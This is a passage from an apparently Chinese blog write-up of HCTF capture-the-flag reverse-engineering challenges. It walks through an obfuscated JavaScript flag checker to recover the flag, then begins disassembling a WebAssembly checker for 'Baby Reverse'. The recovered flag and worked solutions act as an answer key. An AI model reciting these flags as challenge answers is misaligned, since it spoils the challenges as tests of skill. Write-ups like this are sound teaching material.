class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 启动Debugger，干扰console</span></span><br><span class="line"><span class="comment">            (function () &#123;</span></span><br><span class="line"><span class="comment">                (function _0x3c3bd8() &#123;</span></span><br><span class="line"><span class="comment">                    try &#123;</span></span><br><span class="line"><span class="comment">                        (function _0x4dc510(_0x460a91) &#123;</span></span><br><span class="line"><span class="comment">                            if ((&#x27;&#x27; + _0x460a91 / _0x460a91)[_0xa180(&#x27;0x30&#x27;)] !== 0x1 || _0x460a91 % 0x14 === 0x0) &#123;</span></span><br><span class="line"><span class="comment">                                (function () &#123;&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)());</span></span><br><span class="line"><span class="comment">                            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                                debugger;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            _0x4dc510(++_0x460a91);</span></span><br><span class="line"><span class="comment">                        &#125;(0x0));</span></span><br><span class="line"><span class="comment">                    &#125; catch (_0x30f185) &#123;</span></span><br><span class="line"><span class="comment">                        setTimeout(_0x3c3bd8, 0x1388);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            &#125;());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第三段base32编码，去除等号</span></span><br><span class="line">        a = b2c(inputs[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge2 = stringToHex(a) ^ <span class="number">0x53a3f32</span>;  <span class="comment">// a = 0x53a3f32 ^ 0x4b7c0a73 = 0x4e463541 = &#x27;NF5A====&#x27; = &#x27;iz&#x27;</span></span><br><span class="line">        <span class="comment">// 第二个判断条件，确定第三段的字符为iz</span></span><br><span class="line">        <span class="keyword">if</span> (challenge2 != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第四段base32编码，去除等号</span></span><br><span class="line">        a = b2c(inputs[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge3 = stringToHex(a) ^ challenge2;  <span class="comment">// a = 0x4b7c0a73 ^ 0x4315332 = &#x27;OMYA====&#x27; = &#x27;s0&#x27;</span></span><br><span class="line">        <span class="comment">// 第三个判断条件，确定第四段的字符为s0</span></span><br><span class="line">        <span class="keyword">if</span> (challenge3 != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0x4315332 * 0x4b7c0a73 * 第一段的长度</span></span><br><span class="line">        n = challenge3 * challenge2 * inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line"></span><br><span class="line">        h = <span class="function"><span class="keyword">function</span> (<span class="params">seq, callback</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; seq[_0x43c8d1(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                result += callback(seq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二段以“3”进行分割</span></span><br><span class="line">        j = inputs[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="comment">// 分割后的第一段和第二段长度相等</span></span><br><span class="line">        challenge4_1 = j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 异或以后等于0x1613</span></span><br><span class="line">        challenge4_2 = (stringToHex(j[<span class="number">0x0</span>]) ^ stringToHex(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>;</span><br><span class="line">        <span class="comment">// 第四个判断条件</span></span><br><span class="line">        <span class="comment">// if (challenge4_1 || challenge4_2) &#123;</span></span><br><span class="line">        <span class="comment">//     return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// x.charCodeAt() * input[1].length</span></span><br><span class="line">        k = <span class="function"><span class="params">x</span> =&gt;</span> x[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * inputs[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 分割后的第一段每一个字符 * 第二段的长度，再加起来</span></span><br><span class="line">        challenge5 = h(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="comment">// 第五个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge5 != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定flag一共有五段</span></span><br><span class="line">        <span class="comment">// 第五段的前四个字符 - 0x48a05362 == n % 0x2f9b5072</span></span><br><span class="line">        m = stringToHex(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % challenge5;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">repreat</span>(<span class="params">char, count</span>) </span>&#123;  <span class="comment">// char * count</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; count; i++) &#123;</span><br><span class="line">                result += char;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        challenge6_1 = !m;</span><br><span class="line">        <span class="comment">// 第五段第六个字符 * 2 ！= 第五段最后四个字符（除去了“&#125;”）</span></span><br><span class="line">        challenge6_2 = repreat(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="comment">// 第五段的最后一个字符（除去了“&#125;”） - 第五段第五个字符 == 1</span></span><br><span class="line">        challenge6_3 = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>;</span><br><span class="line">        <span class="comment">// 第六个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge6_1 || challenge6_2 || challenge6_3) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        a = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>)</span><br><span class="line">        b = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)</span><br><span class="line">        c = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)]</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符的hex == 第五段第七个字符 * 第五段的长度 * 5</span></span><br><span class="line">        o = stringToHex(a)[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == b[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * c * <span class="number">0x5</span>;</span><br><span class="line">        challenge7_1 = o;</span><br><span class="line">        <span class="comment">// 第五段第五个字符 == &#x27;2&#x27;</span></span><br><span class="line">        <span class="comment">// 根据challenge6_3得出第五段最后一个字符为3</span></span><br><span class="line">        challenge7_2 = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span>;</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符 == 第五段第八个字符 * 2</span></span><br><span class="line">        challenge7_3 = a == repreat(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">        <span class="comment">// 最终的判断条件</span></span><br><span class="line">        <span class="keyword">return</span> challenge7_1 &amp;&amp; challenge7_2 &amp;&amp; challenge7_3;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        <span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// var input = document[_0xa180(&#x27;0x32&#x27;)](_0xa180(&#x27;0x33&#x27;))[&#x27;value&#x27;];</span></span><br><span class="line">    <span class="comment">// 修改为从query获取GET参数方便调试</span></span><br><span class="line">    input = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURI</span>(r[<span class="number">2</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result = check(input);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// window.console.clear();window.console.log(&#x27;Welcome to HCTF :&gt;&#x27;)</span></span><br><span class="line">    <span class="comment">//setInterval(_0xa180(&#x27;0x38&#x27;), 0x32); // 干扰console</span></span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要的判断逻辑在check函数里，首先看到最后的<code>inputs[0x4]</code>可以确定输入一共有五段，以下划线“_”分割，并且已知以“hctf{”开头，以“}”结尾。<br>推测<code>hctf&#123;xxxx_xxxx_xxxx_xxxx_xxxx&#125;</code></p>
<p>在challenge1处需要的条件是</p>
<ol>
<li>(第一段的最后两个字符的hex ^ ‘{‘的hex) % 第一段长度 == 5</li>
</ol>
<p>可知第一段长度为7</p>
<p>在challenge2处需要的条件是</p>
<ol>
<li>第三段的base32除去等号的hex ^ 0x53a3f32 == 0x4b7c0a73</li>
</ol>
<p>由此可以计算出第三段的base32除去等号的hex为0x4e463541，转为base32为NF5A====，解码为iz<br>推测<code>hctf&#123;xx_xxxx_iz_xxxx_xxxx&#125;</code></p>
<p>在challenge3处需要的条件是</p>
<ol>
<li>第四段的base32除去等号的hex ^ 0x4b7c0a73 == 0x4315332</li>
</ol>
<p>由此可以计算出第四段的base32除去等号的hex为0x4f4d5941，转为base32为OMYA====，解码为s0<br>推测<code>hctf&#123;xx_xxxx_iz_s0_xxxx&#125;</code></p>
<p>在challenge4处需要的条件是</p>
<ol>
<li>第二段中必须包含一个’3’</li>
<li>第二段以’3’分割，前后的长度相等</li>
<li>前后hex异或得到的结果是0x1613，</li>
</ol>
<p>由此得出第二段中间为3<br>推测<code>hctf&#123;xx_xx3xx_iz_s0_xxxx&#125;</code></p>
<p>在challenge5处需要的条件是</p>
<ol>
<li>第二段分割以后的第一段，即’3’之前的每一个字符 * 第二段的长度，再加起来 == 0x2f9b5072</li>
</ol>
<p>假设第二段长度为5，则0x2f9b5072/5除不尽，那么第二段长度为7，得出第二段第一部分的和为114108118，转为字符串为rev<br>再根据challenge4.3得出第二段后面的字符串hex为0x726576 ^ 0x1613=0x727365，转为字符串为rse<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_xxxx&#125;</code></p>
<p>在challenge6处需要的条件是</p>
<ol>
<li>第五段的前四个字符hex - 0x48a05362 == (0x4315332 * 0x4b7c0a73 * 第一段的长度) % 0x2f9b5072</li>
<li>第五段第六个字符 + 第五段第六个字符 ！= 第五段除去’}’外最后五个字符，即xxxx}中的xxxx</li>
<li>第五段的倒数第二个字符 - 第五段第五个字符 == 1</li>
</ol>
<p>根据challenge1的结论以及challenge6.1可以算出第五段前四个字符的hex为0x68347246，转为字符串为h4rd<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rdxxxx&#125;</code></p>
<p>在challenge7处需要的条件是</p>
<ol>
<li>第五段第七和第八个字符的hex数字 == 第五段第七个字符 * 第五段的长度 * 5</li>
<li>第五段第五个字符 == ‘2’</li>
<li>第五段第七第八个字符 == 第五段第八个字符 + 第五段第吧个字符，即第五段第七和第八个字符相同</li>
</ol>
<p>根据challenge7.2可知<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxxx&#125;</code></p>
<p>根据challenge6.3可知<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxx3&#125;</code></p>
<p>根据附加条件1<br><code>flag.substr(-5,3)==&quot;333&quot;</code></p>
<p>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxx3333&#125;</code></p>
<p>根据附加条件2<br><code>flag.substr(-8,1)==&quot;3&quot;</code></p>
<p>可知第五段长度为8+5=13，并且第六个字符为’3’<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23xx3333&#125;</code></p>
<p>根据challenge7.1可以计算出第五段第七第八个字符的hex为0x6565，转为字符串为ee<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p>
<p>根据challenge1以及附加条件4<br><code>sha256(flag) == &quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;</code></p>
<p>最终爆破出第一段最后两个字符为j5<br>得到flag为<br><code>hctf&#123;j5_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p>
<hr>
<h1 id="Baby-Reverse-200"><a href="#Baby-Reverse-200" class="headerlink" title="Baby Reverse(200)"></a>Baby Reverse(200)</h1><p>打开网页源码在JavaScript里对输入的字符串进行了处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btnCheck = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btnCheck&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tbxFlag = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> txtStatus = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;status&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var _debug_asm;</span></span><br><span class="line"><span class="comment">// var _debug_mem;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_c_string</span>(<span class="params">buf, index, s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">        buf[index + i] = s.charCodeAt(i);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[index + i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;flag.wasm&#x27;</span>)</span><br><span class="line">.then(<span class="function"><span class="params">response</span> =&gt;</span> response.arrayBuffer())</span><br><span class="line">.then(WebAssembly.instantiate)</span><br><span class="line">.then(<span class="function"><span class="params">mod</span> =&gt;</span> mod.instance)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">asm</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mem = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(asm.exports.memory.buffer);</span><br><span class="line">    <span class="comment">// _debug_mem = mem;</span></span><br><span class="line">    <span class="comment">// _debug_asm = asm;</span></span><br><span class="line"></span><br><span class="line">    btnCheck.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = tbxFlag.value;</span><br><span class="line">        <span class="comment">// console.log(flag);</span></span><br><span class="line">        <span class="keyword">var</span> buf_addr = asm.exports.get_buf();</span><br><span class="line">        set_c_string(mem, buf_addr, flag);</span><br><span class="line">        <span class="keyword">if</span>(asm.exports.check_flag(buf_addr))&#123;</span><br><span class="line">            txtStatus.innerText = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toLocaleString() + <span class="string">&#x27; * - * - * Correct flag! * - * - *&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            txtStatus.innerText = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toLocaleString() + <span class="string">&#x27; Wrong flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;ready&#x27;</span>); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到最后交给了flag.wasm处理，wasm是WebASsembly的二进制格式文件，下载flag.wasm使用wabt进行逆向。首先将二进制格式的flag.wasm转换为文本格式wat，懒得下载的可以使用<a target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/demo/wasm2wat/">在线工具</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type $t0 (func (result i32)))</span><br><span class="line">  (type $t1 (func (param i32) (result i32)))</span><br><span class="line">  (func $get_buf (export &quot;get_buf&quot;) (type $t0) (result i32)</span><br><span class="line">    (i32.const 80))</span><br><span class="line">  (func $check_flag (export &quot;check_flag&quot;) (type $t1) (param $p0 i32) (result i32)</span><br><span class="line">    (local $l1 i32) (local $l2 i32)</span><br><span class="line">    (local.set $l1</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (local.set $l2</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (loop $L0</span><br><span class="line">      (local.set $l1</span><br><span class="line">        (i32.or</span><br><span class="line">          (i32.xor</span><br><span class="line">            (i32.shr_s</span><br><span class="line">              (i32.shl</span><br><span class="line">                (i32.xor</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $p0)</span><br><span class="line">                      (local.get $l2)))</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $l2)</span><br><span class="line">                      (i32.const 16))))</span><br><span class="line">                (i32.const 24))</span><br><span class="line">              (i32.const 24))</span><br><span class="line">            (i32.const 66))</span><br><span class="line">          (local.get $l1)))</span><br><span class="line">      (br_if $L0</span><br><span class="line">        (i32.ne</span><br><span class="line">          (local.tee $l2</span><br><span class="line">            (i32.add</span><br><span class="line">              (local.get $l2)</span><br><span class="line">              (i32.const 1)))</span><br><span class="line">          (i32.const 23))))</span><br><span class="line">    (i32.eqz</span><br><span class="line">      (local.get $l1)))</span><br><span class="line">  (table $T0 0 funcref)</span><br><span class="line">  (memory $memory (export &quot;memory&quot;) 1)</span><br><span class="line">  (data $d0 (i32.const 16) &quot;$.#%9\0a&#39;..-\15&#39; \0311&#39;&#x2F; .;?B&quot;)</span><br><span class="line">  (data $d1 (i32.const 48) &quot;flag&#123;ThisFlagIsFake&#125;\00&quot;))</span><br></pre></td></tr></table></figure>

<p>直接看反汇编代码还是有点复杂，可以进一步将其反编译为C代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;wasm-rt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 